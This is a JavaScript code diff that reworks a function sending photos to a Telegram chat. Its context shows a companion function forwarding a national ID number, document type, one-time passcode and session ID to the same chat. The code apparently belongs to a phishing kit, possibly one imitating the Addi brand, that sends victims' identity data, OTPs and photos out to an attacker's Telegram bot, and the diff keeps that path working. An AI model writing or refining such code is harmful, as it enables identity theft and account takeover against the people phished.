@@ -159,20 +159,37 @@ async function enviarMensajeOTP({ cedula, docType, otp, sessionId }) {
   }
 }
 
-// Enviar foto al chat de Telegram vía multipart
+// Enviar foto al chat de Telegram (multipart manual, sin form-data)
 async function enviarFotoTelegram(base64Str, filename, caption) {
   try {
-    const FormData = require('form-data');
     const buf = Buffer.from(base64Str.replace(/^data:image\/\w+;base64,/, ''), 'base64');
-    const form = new FormData();
-    form.append('chat_id', CHAT_ID);
-    form.append('photo', buf, { filename, contentType: 'image/jpeg' });
-    if (caption) form.append('caption', caption);
+    const boundary = 'AddiB' + Date.now().toString(16);
+    const CRLF = '\r\n';
+    const field = (name, value) =>
+      `--${boundary}${CRLF}Content-Disposition: form-data; name="${name}"${CRLF}${CRLF}${value}${CRLF}`;
+    let parts = [field('chat_id', CHAT_ID)];
+    if (caption) parts.push(field('caption', caption));
+    const photoHeader =
+      `--${boundary}${CRLF}` +
+      `Content-Disposition: form-data; name="photo"; filename="${filename}"${CRLF}` +
+      `Content-Type: image/jpeg${CRLF}${CRLF}`;
+    const body = Buffer.concat([
+      Buffer.from(parts.join('')),
+      Buffer.from(photoHeader),
+      buf,
+      Buffer.from(`${CRLF}--${boundary}--${CRLF}`)
+    ]);
     const res = await fetch(getTelegramApiUrl('sendPhoto'), {
-      method: 'POST', body: form, headers: form.getHeaders()
+      method: 'POST',
+      headers: {
+        'Content-Type': `multipart/form-data; boundary=${boundary}`,
+        'Content-Length': body.length
+      },
+      body
     });
     const data = await res.json();
     if (!data.ok) console.error('[SEND PHOTO ERROR]', data.description);
+    else console.log('[SEND PHOTO OK]', filename);
   } catch(e) {
     console.error('[SEND PHOTO ERROR]', e.message);
   }
